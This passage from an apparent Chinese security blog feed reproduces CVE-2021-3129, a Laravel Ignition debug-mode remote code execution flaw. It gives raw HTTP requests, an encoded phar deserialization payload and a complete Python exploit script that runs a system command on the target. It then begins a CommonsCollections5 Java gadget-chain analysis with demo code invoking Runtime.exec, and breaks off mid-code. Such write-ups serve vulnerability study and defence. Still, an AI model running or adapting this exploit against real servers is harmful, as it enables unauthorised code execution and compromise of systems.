class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6422<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;AAAAAAAAAAAAAAA=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=39=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6D=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=0A=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=0A=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=0A=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=0A=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=0A=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=79=00=4F=00=69=00=4A=00=70=00=5A=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=0A=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=0A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=0A=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=54=00=61=00=58=00=70=00=6C=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=6C=00=6B=00=0A=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=0A=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=0A=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=6B=00=59=00=72=00=45=00=59=00=41=00=51=00=41=00=0A=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=6B=00=59=00=72=00=45=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=64=00=47=00=56=00=7A=00=0A=00=64=00=46=00=6E=00=43=00=31=00=72=00=64=00=4B=00=2B=00=68=00=65=00=2F=00=56=00=6F=00=6A=00=42=00=62=00=6C=00=61=00=35=00=46=00=56=00=72=00=32=00=55=00=53=00=52=00=68=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/22.png"></p><p>将日志文件转化成phar文件。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>326<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/23.png"></p><p>最后利用<code>phar</code>反序列化日志文件（转化之后的）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>237<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;phar:///home/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log/test.txt&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功触发：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/24.png"></p><h1 id="3-利用脚本"><a href="#3-利用脚本" class="headerlink" title="3.利用脚本"></a>3.利用脚本</h1><p>我将日志文件转换成phar文件并进行反序列化操作写成python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment">#首先需要使用phpggc工具生成base64格式的payload：php -d&#x27;phar.readonly=0&#x27; ./phpggc monolog/rce1 system ifconfig --phar phar -o php://output | base64</span><br><span class="hljs-comment">#该方法用来将base64的payload进行字符集转换</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CreatePayload</span>():</span><br>    payload = <span class="hljs-string">&#x27;&#x27;&#x27;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQq9AgAAAgAAABEAAAABAAAAAABmAgAATzozMjoi</span><br><span class="hljs-string">TW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5</span><br><span class="hljs-string">OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7Tzoy</span><br><span class="hljs-string">OToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047</span><br><span class="hljs-string">czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntp</span><br><span class="hljs-string">OjA7czoyOiJpZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5p</span><br><span class="hljs-string">dGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNz</span><br><span class="hljs-string">b3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX1zOjEzOiIAKgBi</span><br><span class="hljs-string">dWZmZXJTaXplIjtpOi0xO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjI6e2k6MDtzOjI6Imlk</span><br><span class="hljs-string">IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7</span><br><span class="hljs-string">YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7</span><br><span class="hljs-string">aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0FAAAAZHVtbXkEAAAAS8fEYAQA</span><br><span class="hljs-string">AAAMfn/YpAEAAAAAAAAIAAAAdGVzdC50eHQEAAAAS8fEYAQAAAAMfn/YpAEAAAAAAAB0ZXN0dGVz</span><br><span class="hljs-string">dGAgCqgiRkqMTJN8uEIALfT7e2IlAgAAAEdCTUI=&#x27;&#x27;&#x27;</span> <span class="hljs-comment"># base64 payload</span><br>    armedPayload = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>        i = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(i.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()<br>        armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><br>    lastpayload = <span class="hljs-string">&quot;AAAAAAAAAAAAAAA&quot;</span>+armedPayload<span class="hljs-comment">#前面加15个字符</span><br>    <span class="hljs-keyword">return</span> lastpayload<br><br><span class="hljs-comment">#发送payload到目标</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RequestTarget</span>(<span class="hljs-params">url,viewFileData</span>):</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br>    &#125;<br>    payload = &#123;<br>        <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>        <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>        <span class="hljs-string">&quot;viewFile&quot;</span>: viewFileData<br>        &#125;<br>    &#125;<br>    r = requests.post(url,data = json.dumps(payload),headers = headers)<br>    print(r.status_code)<br>    <span class="hljs-keyword">return</span> r.text<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8000/_ignition/execute-solution&quot;</span><br>    clearCommand = <span class="hljs-string">&quot;php://filter/read=consumed/resource=/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log&quot;</span><br>    putAACommand = <span class="hljs-string">&quot;AA&quot;</span><br>    payload = CreatePayload()<br>    changeLogTopharCmd = <span class="hljs-string">&quot;php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log&quot;</span><br>    pharunserialCmd = <span class="hljs-string">&quot;phar:///home/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log/test.txt&quot;</span><br>    <span class="hljs-comment">#清空日志文件</span><br>    RequestTarget(url,clearCommand)<br>    <span class="hljs-comment">#添加AA前缀</span><br>    RequestTarget(url, putAACommand)<br>    <span class="hljs-comment">#写入payload</span><br>    RequestTarget(url, payload)<br>    <span class="hljs-comment">#将日志文件转换成phar格式</span><br>    RequestTarget(url, changeLogTopharCmd)<br>    <span class="hljs-comment">#phar反序列化操作</span><br>    result = RequestTarget(url, pharunserialCmd)<br>    indexof =<span class="hljs-built_in">int</span>(result.find(<span class="hljs-string">&quot;&lt;!doctype html&gt;&quot;</span>)) <br>    print(result[<span class="hljs-number">0</span>:indexof])<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/25.png"></p><h1 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h1><p><a href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/14702897.html">https://www.cnblogs.com/zpchcbd/p/14702897.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在CISCN2021的线上初赛有一道题就是利用&lt;code&gt;file_get_contents&lt;/code&gt;反序列化</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://reader-l.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections5利用链分析学习</title>
    <link href="https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
    <id>https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-17T08:04:10.000Z</published>
    <updated>2021-05-17T09:03:03.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>学习<code>CommonsCollections1</code>之后，我们知道该利用链是通过<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类的下的<code>invoke</code>方法来调用到<code>LazyMap#get</code>:</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/1.png"></p><p>而<code>CommonsCollections5</code>则是找到其他调用到<code>LazyMap#get</code>的方法，这就是这次学习的重点。</p><h1 id="2-限制条件"><a href="#2-限制条件" class="headerlink" title="2.限制条件"></a>2.限制条件</h1><h2 id="利用版本："><a href="#利用版本：" class="headerlink" title="利用版本："></a>利用版本：</h2><p>CommonsCollections 3.1 - 3.2.1</p><h2 id="JDK限制版本："><a href="#JDK限制版本：" class="headerlink" title="JDK限制版本："></a>JDK限制版本：</h2><p>JDK版本：java 7是不行的。</p><h1 id="3-利用链分析"><a href="#3-利用链分析" class="headerlink" title="3.利用链分析"></a>3.利用链分析</h1><p><code>Gadget chain</code>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">        ObjectInputStream.readObject()</span><br><span class="hljs-comment">            BadAttributeValueExpException.readObject()</span><br><span class="hljs-comment">                TiedMapEntry.toString()</span><br><span class="hljs-comment">                    LazyMap.get()</span><br><span class="hljs-comment">                        ChainedTransformer.transform()</span><br><span class="hljs-comment">                            ConstantTransformer.transform()</span><br><span class="hljs-comment">                            InvokerTransformer.transform()</span><br><span class="hljs-comment">                                Method.invoke()</span><br><span class="hljs-comment">                                    Class.getMethod()</span><br><span class="hljs-comment">                            InvokerTransformer.transform()</span><br><span class="hljs-comment">                                Method.invoke()</span><br><span class="hljs-comment">                                    Runtime.getRuntime()</span><br><span class="hljs-comment">                            InvokerTransformer.transform()</span><br><span class="hljs-comment">                                Method.invoke()</span><br><span class="hljs-comment">                                    Runtime.exec()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Requires:</span><br><span class="hljs-comment">commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>看完<code>Gadget chain</code>，可以发现该链的与<code>CommonsCollections1</code>的不同就是在这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*BadAttributeValueExpException.readObject()</span><br><span class="hljs-comment">                TiedMapEntry.toString()</span><br><span class="hljs-comment">                    LazyMap.get()</span><br></code></pre></td></tr></table></figure><p>跟进<code>TiedMapEntry</code>类进行查看：</p><p>​    可以发现通过该类的构造函数，我们可以控制<code>this.map</code>被赋值成<code>LazyMap</code>对象，只要再调用<code>getValue</code>方法的话，则可以触发<code>LazyMap#get</code>了。</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/2.png"></p><p>接下来我们需要去找到哪里会调用<code>getValue</code>方法，正好在<code>TiedMapEntry</code>类下<code>toString</code>方法正好调用<code>getValue</code>方法。</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/3.png"></p><p>demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> String[] &#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span> &#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outtermap = LazyMap.decorate(innermap,chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outtermap,<span class="hljs-number">1</span>);<br>        